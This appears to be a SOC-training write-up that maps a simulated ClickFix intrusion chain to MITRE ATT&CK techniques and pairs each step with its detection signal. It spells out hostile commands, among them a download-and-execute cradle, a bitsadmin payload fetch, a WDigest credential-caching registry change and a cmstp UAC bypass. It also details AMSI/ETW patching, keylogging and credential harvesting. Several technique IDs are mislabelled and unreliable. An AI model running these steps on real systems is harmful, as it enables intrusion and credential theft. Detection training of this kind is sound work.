# Scenario 02 — ClickFix: MITRE ATT&CK Coverage (Flow Order)

This document lists every MITRE ATT&CK technique exercised by the scenario, in the order they fire during a run. Each entry includes: the technique ID, name, what it does in this scenario, and the code reference (`file:line`) where it is implemented.

The chain is built so the SOC team can identify each phase by its Sysmon/Winlogbeat signal. See `idea.md` §"SOC Detection Signals" for the EID-by-EID mapping.

---

## Tactic: Initial Access

### T1654 — Logon Trigger (ClickFix / fake CAPTCHA) *(no MITRE ID; maps to social engineering via T1204.002)*
- **What:** User is lured to a fake CAPTCHA/verification page that copies a PowerShell one-liner to the clipboard. User pastes into Win+R and presses Enter. Short, no file written, no double-click.
- **Where:** Out-of-band; the page itself is not part of the scenario's code. The one-liner template is in `idea.md` §"Phase 1 — ClickFix Execution".
- **Detection:** Sysmon EID 1 — `powershell.exe` with parent: `explorer.exe` (Run dialog inheritance), command-line contains `Net.WebClient.DownloadString` and `IEX`.

---

## Tactic: Execution

### T1059.001 — Command and Scripting Interpreter: PowerShell (download cradle)
- **What:** The one-liner from the fake CAPTCHA page runs `Invoke-WebRequest` (via `Net.WebClient.DownloadString`) to fetch `loader.ps2` from GitHub and pipes it to `iex`.
- **Where:** `loader.ps2:6` (`$scriptBase`); the one-liner template is in `idea.md` §"Phase 1".
- **Detection:** Sysmon EID 1 — `powershell.exe` command-line contains `DownloadString`, `IEX`, base64 of `iex` invocation.

### T1548.002 — Bypass UAC: cmstp.exe auto-elevation *(used in T1003.001 enable, but elevation gate here uses Start-Process RunAs)*
- **What:** `loader.ps2` self-elevates via `Start-Process powershell -Verb RunAs` if the initial Run-dialog process is not admin. The elevated child re-fetches the same script and runs it.
- **Where:** `loader.ps2:31-44` (`isAdmin` gate, `Start-Process powershell -Verb RunAs`).
- **Detection:** Sysmon EID 1 — `powershell.exe` re-spawned with `-Verb RunAs`; Winlogbeat 4672 (special privileges).

### T1562.001 — Impair Defenses: Disable or Modify Tools (AMSI bypass)
- **What:** A sacrificial child `powershell.exe` (`-Enc`) runs the byte-patch against `amsi.dll!AmsiScanBuffer` and `ntdll!EtwEventWrite`. Run in a child process because the inline reflection + byte-patch can trigger TerminateProcess on hardened hosts (PPL AMSI consumer); child dies, parent lives.
- **Where:** `loader.ps2:99-198` (`$bypassChild` here-string, `Start-Process powershell -WindowStyle Hidden`).
- **Detection:** Sysmon EID 10 — `VirtualProtect` + `WriteProcessMemory` to `amsi.dll` and `ntdll.dll` code sections from `powershell.exe`. EID 1 — short-lived `powershell.exe` child with `-Enc` arg and `-WindowStyle Hidden`.

### T1562.006 — Impair Defenses: Indicator Blocking (ETW patching)
- **What:** Same child process patches `EtwEventWrite` → `ret` (0xC3) so subsequent process telemetry events are silently dropped.
- **Where:** `loader.ps2:148-153` (C# `Bypass.Go()` writes 0xC3 to `ntdll!EtwEventWrite`).
- **Detection:** Sysmon EID 10 — same EID 10 as T1562.001; SOC will see a "stop" of telemetry from the chain's children for the rest of the run.

### T1105 — Ingress Tool Transfer
- **What:** `loader.ps2` downloads `payload.dll`, `stage.sct`, and `stage.js` from GitHub to scattered paths. `payload.dll` is also re-staged into the noise-friendly `Package Cache\{guid}\package.dll`.
- **Where:** `loader.ps2:225-279` (`Invoke-WebRequest` to `payloadPath`, `sctPath`, `jsPath`); `loader.ps2:247-257` (re-stage to `pkgCachePath`).
- **Detection:** Sysmon EID 3 — outbound TLS to `raw.githubusercontent.com`; EID 11 — file creates in `Crypto\RSA\S-1-5-18`, `Crypto\RSA\MachineKeys`, `Windows\WER\ReportQueue`, `Package Cache\{guid}`.

### T1027 — Obfuscated Files or Information
- **What:** `spoof.cs` (PPID-spoof + arg-spoof C#) is base64-embedded in `loader.ps2` as `$spoofBase64` and only decoded at runtime. The `loader.ps2` here-string has no plain C# in any AMSI-scanned scriptblock. Additionally, `Bypass.cs` uses `ushort` arithmetic to compute patch bytes (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) — no literal 0xB8/0xC3 in source.
- **Where:** `loader.ps2:222` (the `$spoofBase64` blob, refreshed by `make sync`); `loader.ps2:124-156` (C# `Bypass` source with arithmetic-encoded patch bytes).
- **Detection:** Static — strings of the C# source are not visible without base64 decode; the patch bytes don't appear as literals.

### T1059.005 — Command and Scripting Interpreter: Visual Basic (HTA generation)
- **What:** `loader.ps2` decodes the embedded C# blob and inlines it into a generated HTA (`report.hta`) at `C:\ProgramData\Microsoft\Windows\WER\Temp\report.hta`. The HTA contains the full chain: stage copies, `tcmsetup.exe` run, Squiblydoo, cscript.
- **Where:** `loader.ps2:281-284` (base64 decode); `loader.ps2:287-437` (`$htaContent` here-string + `WriteAllText`).
- **Detection:** Sysmon EID 11 — `report.hta` created in `Windows\WER\Temp\`; EID 7 — `mshtml.dll` (HTA host) loaded by `mshta.exe` shortly after.

### T1218.005 — System Binary Proxy Execution: Mshta
- **What:** `mshta.exe` is launched with PPID-spoofed parent (`explorer.exe`) via `spoof.cs::SpawnWithParent` to execute `report.hta`.
- **Where:** `loader.ps2:439-467` (`Add-TypeInMem` of spoof.cs + `SpawnWithParent("mshta.exe ...", explorerPid)`); `spoof.cs:138-189` (`SpawnWithParent`).
- **Detection:** Sysmon EID 1 — `mshta.exe` parent = `explorer.exe`; image path is `C:\Windows\System32\mshta.exe`; EID 7 — `mshtml.dll` + the generated `report.hta` loaded by `mshta.exe`.

### T1055.012 — Process Injection: Process Hollowing (used here for PPID Spoofing)
- **What:** `spoof.cs::SpawnWithParent` uses `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` (`UpdateProcThreadAttribute`) to make the new `mshta.exe` inherit `explorer.exe`'s handle as the parent. The child mshta runs under `explorer.exe`'s medium-IL user token (the limitation called out in `idea.md` §"Root Cause 1"); the process tree in EID 1 shows `explorer.exe → mshta.exe` (clean, but for the wrong reason).
- **Where:** `spoof.cs:126-189` (`ProcThreadAttributeParentProcess`, `CreateProcess` with `EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW`).
- **Detection:** Sysmon EID 10 — `OpenProcess(PROC_CREATE_PROCESS)` on `explorer.exe`; EID 1 — mshta's ParentImage is `explorer.exe`, but only the spoofed cmdline tells the full story (WMI Win32_Process parent for mshta).

### T1574.002 — Hijack Execution Flow: DLL Side-Loading
- **What:** The HTA Stage 1 copies `package.dll` → `C:\Users\Public\Libraries\msimtf.dll` (renamed to mimic Microsoft IME). The HTA Stage 2 then copies a signed Microsoft binary (`tcmsetup.exe` preferred, `colorcpl.exe` fallback for Win11 22H2+) into the same directory. When the binary runs, Windows resolves `msimtf.dll` from the binary's own directory → `payload.dll` loads.
- **Where:** `loader.ps2:352-354` (`CopyFile` to `msimtf.dll`); `loader.ps2:357-383` (select `tcmsetup.exe` or `colorcpl.exe`, copy to `Libraries\`).
- **Detection:** Sysmon EID 1 — `tcmsetup.exe` (or `colorcpl.exe`) from `C:\Users\Public\Libraries\` (unexpected path); EID 11 — `msimtf.dll` created in `Libraries\`; EID 7 — `msimtf.dll` image load inside the sideloader process.

### T1218.010 — Signed Binary Proxy Execution: Regsvr32 (Squiblydoo)
- **What:** The HTA Stage 3 spawns a child PowerShell that runs `iex (irm "$scriptBase/boot.ps1")` (AMSI re-patch in a fresh process), then `Add-TypeInMem` on the decoded `spoof.cs`, then calls `Spoof::Go()`. `Spoof::Go()` runs the arg-spoofed `regsvr32.exe` against `stage.sct` via `scrobj.dll` (Squiblydoo).
- **Where:** `loader.ps2:394-402` (HTA Stage 3 psCmd); `spoof.cs:191-272` (`Spoof::Go()` — `CreateProcessW` with `CREATE_SUSPENDED`, PEB walk, `WriteProcessMemory`, `ResumeThread`).
- **Detection:** Sysmon EID 1 — `regsvr32.exe` spawned by `mshta.exe`'s child PowerShell; EID 7 — `scrobj.dll` loaded by `regsvr32.exe` (scriptlet signal); EID 10 — `WriteProcessMemory` to the suspended regsvr32 PEB.

### T1055.012 — Process Injection: Process Hollowing (used here for Process Argument Spoofing)
- **What:** `spoof.cs::Go()` creates `regsvr32.exe` with `CREATE_SUSPENDED`, walks PEB → `ProcessParameters` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`, overwrites the `Buffer` to point at the real Squiblydoo cmdline (`regsvr32 /s /n /u /i:…stage.sct scrobj.dll`). The kernel-side cmdline snapshot (used by Sysmon EID 1) was captured at `CreateProcessW` time and shows the spoofed `regsvr32 /s C:\Windows\System32\jscript.dll` instead.
- **Where:** `spoof.cs:204-272` (PEB walk, `ReadProcessMemory`, `WriteProcessMemory` at `bufferPtr`, `ResumeThread`).
- **Detection:** Sysmon EID 10 — `OpenProcess(PROCESS_VM_WRITE)` on `regsvr32.exe`; the EID 1 cmdline shows `jscript.dll` (the spoof), not `stage.sct` (the real).

### T1218.007 — Signed Binary Proxy Execution: Cscript
- **What:** The HTA Stage 4 spawns `cscript //nologo C:\ProgramData\Microsoft\Windows\WER\ReportQueue\stage.js` (blocking). `stage.js` is a JScript file that performs the same HTTP exfil as `stage.sct`, but in a different LOLBin.
- **Where:** `loader.ps2:404-409` (HTA `WSH.Run("cscript //nologo ...stage.js", 0, true)`); `stage.js:1-42` (JScript exfil loop).
- **Detection:** Sysmon EID 1 — `cscript.exe` spawned by `mshta.exe`; EID 3 — `cscript.exe` outbound HTTP GETs to `<random>.github.com` (NXDOMAIN).

---

## Tactic: Defense Evasion

### T1574.002 (cont.) — DLL Side-Loading → payload.dll in tcmsetup.exe
- **What:** Once `tcmsetup.exe` runs and loads `msimtf.dll`, the renamed `payload.dll`'s `DllMain(DLL_PROCESS_ATTACH)` fires. `payload.c:1740-1741` detects the host exe name (`tcmsetup.exe` or `colorcpl.exe`) and runs `DoThreadHijack()`.
- **Where:** `payload.c:1721-1755` (`DllMain` host detection); `payload.c:222-360` (`DoThreadHijack`).
- **Detection:** EID 7 — `msimtf.dll` (which is `payload.dll`) loaded into the sideloader process; EID 1 — the sideloader is a child of `mshta.exe` (or of the HTA's `WScript.Shell`).

### T1055.004 — Process Injection: Asynchronous Procedure Call (Thread Hijacking)
- **What:** `DoThreadHijack` opens `explorer.exe`, enumerates its threads, suspends one, allocates RWX memory in explorer via `VirtualAllocEx`, writes XOR-obfuscated shellcode (`LoadLibraryA("…package.dll") → GetProcAddress → DllRegisterServer`), `SetThreadContext` redirects RIP to shellcode, `ResumeThread` lets it run. The shellcode's first call is `LoadLibraryA` on the package.dll path → a second copy of `payload.dll` loads into explorer.exe → its `DllMain` runs the `WorkerThread`.
- **Where:** `payload.c:222-360` (`DoThreadHijack`); `payload.c:104-203` (`BuildHijackShellcode`, XOR_KEY=0xAA, call-pop decoder + main 76-byte shellcode); `payload.c:1744-1746` (DllMain in explorer.exe).
- **Detection:** Sysmon EID 10 — `OpenProcess + OpenThread + SuspendThread + VirtualAllocEx(PAGE_EXECUTE_READWRITE) + WriteProcessMemory + SetThreadContext` on `explorer.exe` from the sideloader process; EID 8 does NOT fire (no `CreateRemoteThread`); EID 7 — `msimtf.dll` image load inside `explorer.exe` (second copy of `payload.dll`).

### T1078 — Valid Accounts (explorer.exe token)
- **What:** After the thread hijack, the WorkerThread runs inside `explorer.exe` with the user's existing medium-IL token. When the HTA's Stage 5 (rundll32 `DllRegisterServer`) is later called from the **elevated** loader, a *third* copy of `payload.dll` runs in `rundll32.exe` with the **admin** token, which is what enables T1543.003, T1003.001 (WDigest HKLM write), and T1197.
- **Where:** `loader.ps2:469-518` (Stage 5 in elevated loader); `payload.c:1747-1749` (DllMain in rundll32.exe); `payload.c:1757-1766` (`DllRegisterServer` runs `WorkerThread` synchronously).
- **Detection:** Winlogbeat 4672/4624 — special privileges assigned at logon (SYSTEM from the elevated loader); the rundll32 child shows up as a sibling of mshta, not its child, because Stage 5 was moved out of the HTA (`idea.md` §"Root Cause 1" fix).

### T1562.001 (cont.) — AMSI re-patch in fresh PowerShell (boot.ps1)
- **What:** The HTA Stage 3 child PowerShell fetches `boot.ps1` via `irm` first, which both re-patches AMSI in the fresh process AND defines `Add-TypeInMem` for the in-memory compile of the decoded `spoof.cs`. Without this, the decoded C# source AMSI-fails the text scan before compile.
- **Where:** `loader.ps2:396-399` (psCmd `iex (irm '$scriptBase/boot.ps1')`); `boot.ps1:1-64` (the standalone patcher).
- **Detection:** Sysmon EID 3 — child PowerShell outbound TLS to GitHub for `boot.ps1`; EID 10 — `VirtualProtect` + `WriteProcessMemory` to `amsi.dll` and `ntdll.dll` from the child PowerShell.

### T1059.007 — Command and Scripting Interpreter: JavaScript (JScript)
- **What:** `stage.sct` and `stage.js` both run JScript that performs HTTP exfil via `MSXML2.XMLHTTP`. `stage.sct` runs inside `regsvr32.exe` (Squiblydoo), `stage.js` runs inside `cscript.exe`. Both write to `cache.dat` for SOC visibility.
- **Where:** `stage.sct:9-52` (JScript in CDATA, exfil loop); `stage.js:1-42` (JScript exfil loop).
- **Detection:** Sysmon EID 3 — `regsvr32.exe` and `cscript.exe` outbound HTTP GETs to `<random>.github.com` (NXDOMAIN, 5x each); EID 11 — `cache.dat` appends from both processes.

### T1027.004 — Obfuscated Files or Information: Compile After Delivery
- **What:** `loader.ps2` keeps the C# `spoof.cs` source as a base64 blob, decodes it at runtime, and compiles it in-memory via `Add-Type` with `GenerateInMemory = $true`. No `%TEMP%\*.dll` is written, so Defender's real-time file scan never sees the compiled assembly.
- **Where:** `loader.ps2:18-29` (`Add-TypeInMem` helper); `loader.ps2:282-283` (base64 decode); `loader.ps2:451` (compile in loader for PPID spoof); `loader.ps2:398` (compile in HTA child for arg spoof).
- **Detection:** Sysmon EID 7 — `CSharp` code loaded into a PowerShell process (event 7 fires for the dynamic assembly).

### T1564.003 — Hide Artifacts: Hidden Window
- **What:** All child processes spawned from the elevated loader use `-WindowStyle Hidden` (HTA spawn, SendKeys seed) or `CREATE_NO_WINDOW` (cmstp, sc.exe, reg.exe, payload `CreateProcessW` calls). The HTA's `WScript.Shell.Run` uses `WindowStyle = 0` (hidden) and `bWaitOnReturn = true` for blocking.
- **Where:** `loader.ps2:168` (`-WindowStyle Hidden` on bypass child); `loader.ps2:380` (`shell.Run(..., 0, true)`); `loader.ps2:489` (`-WindowStyle Hidden` for rundll32); `payload.c:174` (`CREATE_NO_WINDOW`); `payload.c:821` (`CREATE_NO_WINDOW` on cmstp).
- **Detection:** Sysmon EID 1 — child processes spawned with no window; behavioral (no visible UI for the chain).

---

## Tactic: Persistence

### T1546.015 — Event Triggered Execution: COM Hijacking
- **What:** `InstallCOMHijack` generates a random GUID via `UuidCreate` + `UuidToStringW`, creates `HKCU\Software\Classes\CLSID\{guid}\InprocServer32\(default)` pointing at `C:\Users\Public\Libraries\Telemetry.dll` (a renamed copy of `payload.dll`). When any legit app instantiates that CLSID, the OS loads `Telemetry.dll` into the app's process → `DllGetClassObject` returns a class factory → `Factory_CreateInstance` queues a WorkerThread.
- **Where:** `payload.c:1008-1066` (`InstallCOMHijack`).
- **Detection:** Sysmon EID 13 — `HKCU\...\CLSID\{guid}\InprocServer32` created; EID 11 — `Telemetry.dll` written to `C:\Users\Public\Libraries\`.

### T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- **What:** `InstallLNKPersistence` creates `OneDrive Update.lnk` in the user's Startup folder via `IShellLinkW` COM. Target: `rundll32.exe C:\Users\Public\Libraries\Telemetry.dll,DllRegisterServer`. The `rundll32.exe` running on next logon calls `DllRegisterServer` (now a synchronous `WorkerThread` dispatch per `payload.c:1757-1766`).
- **Where:** `payload.c:1072-1106` (`InstallLNKPersistence`); `payload.c:1757-1766` (`DllRegisterServer` runs `WorkerThread` synchronously — the fix that keeps the WorkerThread alive when rundll32 exits).
- **Detection:** Sysmon EID 11 — `OneDrive Update.lnk` created in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`; subsequent EID 1 — `rundll32.exe Telemetry.dll,DllRegisterServer` from a user logon shell.

### T1543.003 — Create or Modify System Process: Windows Service
- **What:** `InstallService` runs `sc.exe create WinUpdHlth binPath= "rundll32.exe C:\Users\Public\Libraries\Telemetry.dll,DllRegisterServer" DisplayName= "Microsoft Update Health Tools" start= auto`. This service (if it ran as SYSTEM, which it doesn't in this scenario) would call `DllRegisterServer` on the Telemetry.dll → WorkerThread.
- **Where:** `payload.c:1454-1478` (`InstallService`).
- **Detection:** Winlogbeat 7045 — `WinUpdHlth` service installed; EID 1 — `sc.exe create` spawned by `rundll32.exe` (the elevated Stage 5 process).

### T1197 — BITS Jobs
- **What:** `ScheduleBitsJob` runs `bitsadmin /transfer "Windows Update Health Check" "https://raw.githubusercontent.com/Justanother-engineer/scenario2/main/stage2.dll" "C:\ProgramData\Package Cache\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\stage2.dll"`. If bitsadmin doesn't deliver within 30s, the code falls back to synchronous `WinHttpDownloadToFile` so the T1197 file artifact always lands.
- **Where:** `payload.c:1388-1448` (`ScheduleBitsJob`); `payload.c:1340-1386` (`WinHttpDownloadToFile` fallback).
- **Detection:** EID 3 — `rundll32.exe` outbound TLS to `raw.githubusercontent.com`; BITS-Event log 59 (job created) / 60 (job transferred); EID 11 — `stage2.dll` in `Package Cache\{guid}`.

---

## Tactic: Credential Access

### T1056.001 — Input Capture: Keylogging
- **What:** `KeyloggerThread` runs `SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, ...)` for 120 seconds. The hook proc translates `WM_KEYDOWN` to ASCII via `ToAscii`, falls back to bracketed special names for non-printable keys (`[ENTER]`, `[BACK]`, `[TAB]`, etc.), and writes the buffer to `Telemetry.bin` at the end of the window. The loader's Stage 5 sends 5 synthetic `scenario2[ENTER]` keystrokes 3s into the window so the file is non-empty even on a headless demo run.
- **Where:** `payload.c:366-403` (`LowLevelKeyboardProc`); `payload.c:405-440` (`KeyloggerThread`); `loader.ps2:498-504` (synthetic SendKeys seed).
- **Detection:** Sysmon EID 10 — `SetWindowsHookEx(WH_KEYBOARD_LL)` from `rundll32.exe` (or `svchost.exe` in the host detection path); EID 11 — `Telemetry.bin` written in `USOShared\Logs\`.

### T1003.001 — OS Credential Dumping: LSASS Memory *(WDigest enable, not LSASS dump)*
- **What:** `EnableWDigest` writes a temp INF to `C:\Windows\Temp\~wdg.inf` and runs `cmstp.exe /s /au ~wdg.inf` (CMSTP UAC bypass) to execute `reg.exe add HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f` in the cmstp-elevated context. Subsequent logons will cache cleartext credentials in LSASS for tools like Mimikatz to extract.
- **Where:** `payload.c:786-834` (`EnableWDigest`); the writable-buffer fix is at `payload.c:817-820` (see `ponytail:` comment at `payload.c:813-816`).
- **Detection:** Sysmon EID 1 — `cmstp.exe /s /au` auto-elevated from `rundll32.exe`; EID 11 — `~wdg.inf` in `C:\Windows\Temp\`; EID 1 — `reg.exe add` (no parent in EID, but a child of cmstp); EID 13 — `HKLM\…\WDigest\UseLogonCredential` modified to `1`.

### T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
- **What:** `DoKerberoast` dynamically loads `wldap32.dll` (using `ldap_init` ANSI, the only real export on stock wldap32 — see `idea.md` §"Root Cause 4" fix), `ldap_bind_s` (NEGOTIATE), then `ldap_search_s(baseDn, SUBTREE, "(servicePrincipalName=*)", {spn, samaccountname})`. For each SPN, it builds a `KERB_RETRIEVE_TKT_REQUEST`, calls `LsaCallAuthenticationPackage` (Kerberos package), and logs the TGS status to `spcache.bin`. On non-domain hosts, falls back to `DoKerberoastSynthetic` which writes 5 stub SPNs (HOST/cifs/http/RestrictedKrbHost/TERMSRV) with `TGS status: 0xC000005E (no KDC, synthetic)`.
- **Where:** `payload.c:846-873` (`DoKerberoastSynthetic`); `payload.c:875-1002` (`DoKerberoast` — LDAP load at `payload.c:475-493`, SPN enumeration at `payload.c:948-992`).
- **Detection:** Winlogbeat 5156 — high-volume LDAP queries for `servicePrincipalName` from `rundll32.exe`; EID 11 — `spcache.bin` created in `Search\Data\EDS\`; EID 10 — `LsaCallAuthenticationPackage` (no direct Sysmon signal, but the EID 11 file is the trail).

### T1552.004 — Unsecured Credentials: Private Keys (WiFi)
- **What:** `HarvestWifi` calls `WlanOpenHandle` → `WlanEnumInterfaces` → `WlanGetProfileList` → `WlanGetProfile(WLAN_PROFILE_GET_PLAINTEXT_KEY)` to dump stored WLAN profiles in cleartext. If `WlanOpenHandle` fails (no adapter, Wlansvc stopped), the code attempts `sc.exe start Wlansvc` + retry, then falls back to `WriteSyntheticWifiProfile` which writes a stub wlan-profile XML to `Wifi.bin` so the T1552.004 artifact always exists.
- **Where:** `payload.c:1494-1502` (`WriteSyntheticWifiProfile`); `payload.c:1504-1579` (`HarvestWifi`).
- **Detection:** Sysmon EID 1 — `sc.exe start Wlansvc` from `rundll32.exe`; EID 11 — `Wifi.bin` written in `USOShared\Logs\`; if the adapter is live, EID 4661 (WlanGetProfile handle audit) on the wlanapi handle.

---

## Tactic: Discovery

### T1087.002 — Account Discovery: Domain Account
- **What:** `DoLDAPRecon` runs `ldap_search_s(baseDn, SUBTREE, "(objectClass=computer)", {cn, operatingSystem})` and `ldap_search_s(..., "(objectClass=group)", {cn})` to enumerate domain computers and groups. Output to `index.tmp`. On non-domain hosts, `DoLocalSAMRecon` enumerates local users (`NetUserEnum`), local groups (`NetLocalGroupEnum`), and workgroup browseable servers (`NetServerEnum SV_TYPE_ALL`) — same output file.
- **Where:** `payload.c:503-575` (`DoLocalSAMRecon`); `payload.c:581-671` (`DoLDAPRecon`).
- **Detection:** Winlogbeat 5156 — LDAP queries for `objectClass=computer` and `objectClass=group` from `rundll32.exe`; EID 11 — `index.tmp` created in `Search\Data\EDS\`.

### T1135 — Network Share Discovery
- **What:** `DoSMBRecon` calls `NetServerEnum(SV_TYPE_ALL)`, resolves each server's IP via `gethostbyname`, opens a TCP socket to port 445 with a 3s timeout, then `NetShareEnum` per host to list shares. Output to `state.tmp`.
- **Where:** `payload.c:677-752` (`DoSMBRecon`).
- **Detection:** Sysmon EID 3 — `rundll32.exe` connecting to port 445 on multiple IPs; Winlogbeat 5140/5145 (SMB share enumeration); EID 11 — `state.tmp` in `Windows\WER\ReportArchive\`.

### T1018 — Remote System Discovery *(covered by T1135; same code)*
- **Where:** `payload.c:677-752` (`DoSMBRecon` — `NetServerEnum` is the remote-system primitive).
- **Detection:** As above (EID 3, 5140/5145).

### T1016 — System Network Configuration Discovery
- **What:** `DoAdapterInfo` calls `GetAdaptersInfo` to dump each adapter's name, description, IP, mask, gateway. Output appended to `index.tmp` (same file as LDAP recon).
- **Where:** `payload.c:758-780` (`DoAdapterInfo`).
- **Detection:** No direct Sysmon signal (in-process API call); the resulting text in `index.tmp` is the trail.

### T1069.002 — Permission Groups Discovery: Domain Groups
- **What:** Same code path as T1087.002; the group-enumeration branch of `DoLDAPRecon` queries `(objectClass=group)`. On non-domain hosts, `DoLocalSAMRecon`'s `NetLocalGroupEnum` provides the workgroup equivalent.
- **Where:** `payload.c:651-666` (group search); `payload.c:532-549` (local group fallback).
- **Detection:** As T1087.002 (Winlogbeat 5156).

### T1082 — System Information Discovery *(implicit in cmstp INF execution and in cache.dat log channel; not a primary)*
- **Detection:** Indirect via EID 1 on `cmstp.exe` and EID 11 on `~wdg.inf`.

### T1057 — Process Discovery *(not exercised; the chain doesn't run tasklist)*
- **Detection:** N/A.

---

## Tactic: Collection

### T1074.001 — Data Staged: Local Data Staging
- **What:** All exfiltratable artifacts are written to per-technique subdirectories before any beacon step:
  - `C:\ProgramData\Microsoft\Search\Data\EDS\index.tmp` (LDAP/local SAM recon + adapter info)
  - `C:\ProgramData\Microsoft\Search\Data\EDS\spcache.bin` (Kerberoast SPNs)
  - `C:\ProgramData\Microsoft\Windows\WER\ReportArchive\state.tmp` (SMB recon)
  - `C:\ProgramData\Microsoft\Windows\WER\ReportQueue\queue.tmp` (WinRM probe / domain map)
  - `C:\ProgramData\USOShared\Logs\cache.dat` (main log: recon, beacons, lifecycle)
  - `C:\ProgramData\USOShared\Logs\Telemetry.bin` (keylogger buffer)
  - `C:\ProgramData\USOShared\Logs\BITS.bin` (BITS job metadata)
  - `C:\ProgramData\USOShared\Logs\Wifi.bin` (WiFi profiles)
- **Where:** All `payload.c` writers (`DoLDAPRecon`, `DoSMBRecon`, `DoAdapterInfo`, `DoKerberoast`, `DoWinRMProbe`, `KeyloggerThread`, `ScheduleBitsJob`, `HarvestWifi`).
- **Detection:** EID 11 — burst of file creates in `Search\Data\EDS\`, `Windows\WER\`, `USOShared\Logs\` within seconds of each other.

---

## Tactic: Command and Control

### T1071.001 — Application Layer Protocol: Web Protocols
- **What:** Three C2 channels, all GETs, no payload:
  - `Beacon()` (in `rundll32.exe`): `WinHttpOpen + WinHttpConnect(github.com, 443)` then 5 GETs with 10s `Sleep` between them.
  - `stage.sct` (in `regsvr32.exe`): 5 GETs to `<random>.github.com` via `MSXML2.XMLHTTP` (NXDOMAIN, 5s intervals).
  - `stage.js` (in `cscript.exe`): 5 GETs to `<random>.github.com` via `MSXML2.XMLHTTP` (NXDOMAIN, 5s intervals).
- **Where:** `payload.c:1279-1303` (`Beacon`); `stage.sct:34-48`; `stage.js:26-40`.
- **Detection:** Sysmon EID 3 — three distinct user-agents/processes to `github.com` family: `rundll32.exe` (5x, 10s apart, real `github.com`), `regsvr32.exe` (5x, 5s apart, NXDOMAIN), `cscript.exe` (5x, 5s apart, NXDOMAIN).

### T1572 — Protocol Tunneling *(implicit: TLS to GitHub; not a primary technique)*
- **Detection:** Indirect — the EID 3 captures above are all TLS to `*.github.com`.

### T1571 — Non-Standard Port *(not used; all 443 / 80)*

---

## Tactic: Defense Evasion (Anti-forensics)

### T1070.004 — Indicator Removal: File Deletion
- **What:** After the operator runs `cleanup.ps1`, all 18 scattered artifact files are removed; COM hijack CLSID, LNK, and service persistence are torn down; WDigest is reverted to 0. `cleanup.ps1` self-deletes at the end (after writing the residual report to `cleanup.dat`).
- **Where:** `cleanup.ps1:40-71` (file deletion); `cleanup.ps1:73-91` (COM CLSID removal); `cleanup.ps1:93-109` (LNK removal); `cleanup.ps1:111-125` (service removal); `cleanup.ps1:127-135` (WDigest revert); `cleanup.ps1:181-187` (self-delete).
- **Detection:** Sysmon EID 23 (`FileDelete`) on each of the paths; useful as a "you missed cleanup" forensic signal. EID 1 on `reg.exe add ...UseLogonCredential /d 0 /f` (the WDigest revert).

### T1070.002 — Indicator Removal: Clear Windows Event Logs *(not exercised; Winlogbeat forwarding is left intact so SOC can review)*
- **What:** Not exercised.
- **Detection:** N/A.

### T1562.001 (cont.) — Impair Defenses: re-patch in fresh process
- **What:** Same as the initial AMSI/ETW bypass, but re-applied in the HTA's child PowerShell before Add-Type runs the decoded `spoof.cs`. Without the re-patch, the inline `amsiInitFailed` reflect alone no-ops on modern Windows and the compiled `Add-Type` source AMSI-fails the text scan.
- **Where:** `loader.ps2:396-399` (`iex (irm '$scriptBase/boot.ps1')`); `boot.ps1:22-26` (reflect), `boot.ps1:29-60` (byte-patch).
- **Detection:** Sysmon EID 10 — second batch of `VirtualProtect` + `WriteProcessMemory` to `amsi.dll` + `ntdll.dll`, this time from a PowerShell child of `mshta.exe`.

### T1116 — Code Signing *(proxy via Microsoft binaries)*
- **What:** Every process spawned in the chain is Microsoft-signed: `mshta.exe`, `powershell.exe`, `cscript.exe`, `regsvr32.exe`, `tcmsetup.exe`, `colorcpl.exe`, `rundll32.exe`, `sc.exe`, `cmstp.exe`, `cmd.exe`, `bitsadmin.exe`. The actual payload (`msimtf.dll` / `package.dll` / `Telemetry.dll`) is unsigned, but it runs *inside* the signed sideloader or signed rundll32.
- **Where:** Implicit across all `CreateProcessW` / `Start-Process` / `WSH.Run` call sites in `loader.ps2` and `payload.c`.
- **Detection:** Authenticode audit — `msimtf.dll`, `package.dll`, `Telemetry.dll` in `C:\ProgramData\…\Libraries\` have no signature; the parent chain is signed.

---

## Summary — coverage at a glance

| Tactic | Techniques |
|---|---|
| Initial Access | T1204.002 (ClickFix, social engineering) |
| Execution | T1059.001, T1059.005, T1059.007, T1548.002, T1218.005, T1218.007, T1218.010, T1105, T1027, T1027.004 |
| Persistence | T1546.015, T1547.001, T1543.003, T1197 |
| Privilege Escalation | T1055.012 (PPID + arg spoof), T1055.004 (Thread Hijack), T1548.002 (UAC), T1078 (admin token via Stage 5) |
| Defense Evasion | T1562.001, T1562.006, T1574.002, T1027, T1027.004, T1070.004, T1116, T1564.003 |
| Credential Access | T1056.001, T1003.001 (WDigest), T1558.003, T1552.004 |
| Discovery | T1087.002, T1069.002, T1135, T1018, T1016, T1082 (implicit) |
| Collection | T1074.001 |
| Command and Control | T1071.001 |

**~25 distinct techniques across 9 tactics.** Every technique maps to at least one Sysmon EID, Winlogbeat channel, or BITS-Event — see `idea.md` §"SOC Detection Signals" for the per-EID table.

### Notable coverage choices

- **T1027.004 (compile-after-delivery) + T1562.001 + T1562.006** form the central defense-evasion triad: base64-encoded C# source, in-memory compile (no `%TEMP%\*.dll`), AMSI/ETW re-patched in every fresh PowerShell before `Add-Type` runs.
- **T1574.002 (DLL side-loading) is the persistence-less execution vector** — the entire payload lands in a signed Microsoft process before any post-ex fires.
- **T1055.004 (thread hijack) over T1055.002 (APC)** — `SuspendThread + SetThreadContext` produces a clean EID 10 trail without EID 8 (`CreateRemoteThread`). The XOR-obfuscated shellcode in `payload.c:104-203` is a secondary anti-static-analysis layer.
- **Workgroup host fallbacks** (T1087.002 / T1558.003 / T1021.006) are real local artifacts, not synthetic stubs — see `idea.md` §"Post-Run #2" for the fix history.
